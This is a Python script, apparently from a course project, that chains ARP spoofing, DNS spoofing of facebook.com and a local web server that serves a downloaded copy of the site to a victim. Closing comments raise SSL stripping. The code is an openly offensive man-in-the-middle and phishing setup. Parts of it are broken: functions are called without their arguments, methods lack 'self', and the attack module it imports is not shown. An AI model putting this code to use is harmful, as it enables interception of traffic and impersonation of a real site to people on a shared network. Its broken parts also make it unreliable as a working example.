# This is the full code that includes the ARP spoofing etc.
# In this program, we immitate the website by downloading it whenever the victim connects to it
from arp_attack import *

import http.server
import socketserver
import urllib.request
import socket
import re

# Step 1: Call ARP spoof for the victim for a certain amount of time
victim_ip = ""
attacker_ip = ""
interface = ""
target_url = "http://facebook.com"
target_url_ip = ""

def arp_spoof(params, time):
    victim_mac = get_mac_address(victim_ip)
    target_mac = get_mac_address(target_url_ip)
    mitm_attack(victim_mac, target_mac, interface)

# Step 2: Use the DNS spoof to associate the target website URL with our IP
# Call this function for the target website URL
def dns_spoof():
    dns_attack(interface, attacker_ip, target_url)

import http.server
import socketserver
import urllib.request

import sys
#f = open("user_responses.txt", 'w')
#sys.stderr = f
class MyHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    content = None

    def get_page(url):
        response = urllib.request.urlopen(url)
        return response.read().decode('utf-8')
    
    def get_page_name(url):
        page_name = ""
        regex_pattern = r"https?://([^/]+)"

        match = re.search(regex_pattern, url)
        if match:
            center_part = match.group(1)
            page_name = center_part

        return page_name
    
    def set_page(content):
        self.content = content

    def do_GET(self):
        content = self.content

        # Send the downloaded content as the server response
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(content.encode('utf-8'))
        #with open('user_responses.txt', 'a') as file:
         #   file.write(str(content))
          #  file.close()


# Step 3: Start the webserver

# Function to change the displayed content of the web server
def change_server_page(webserver, url):
    # Webserver is the HTTP Handler
    # Download the content of the new URL
    # Display it
    webserver.set_page(webserver.get_page(url))

def start_server(url):
    # Download the page
    # Display the content of the web page
    # Set up the server
    PORT = 8000  # Replace with the desired port number
    Handler = MyHTTPRequestHandler

    change_server_page(Handler, url)

    httpd = socketserver.TCPServer(("", PORT), Handler)
    print("Server started at port", PORT)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Keyboad Interrupt: Shutting down server")
        httpd.shutdown()
        pass

###### Main function #######
if __name__ == '__main__':
# Spoof the victim so we get all the requests for target website from the victim
    arp_spoof()

# Check if the victim connects to the target website
    # Intercept the packet and don't forward it to prevent the real server from answering
    # Start the webserver with the intended URL
    # Use DNS spoofing to redirect the requests to our IP
    dns_spoof()

# Needs to be a while True loop
# Check if the victim clicks on a link
    # Intercept the packet and extract the original link
    # Call the change_server_page function with the new URL


# TODO Might need to change the redirect links on the original website


#- Cleartext
#- Valid approach for SSL strip?
#- Report, websites as resources ok?
#- Other approaches for SSL stripping?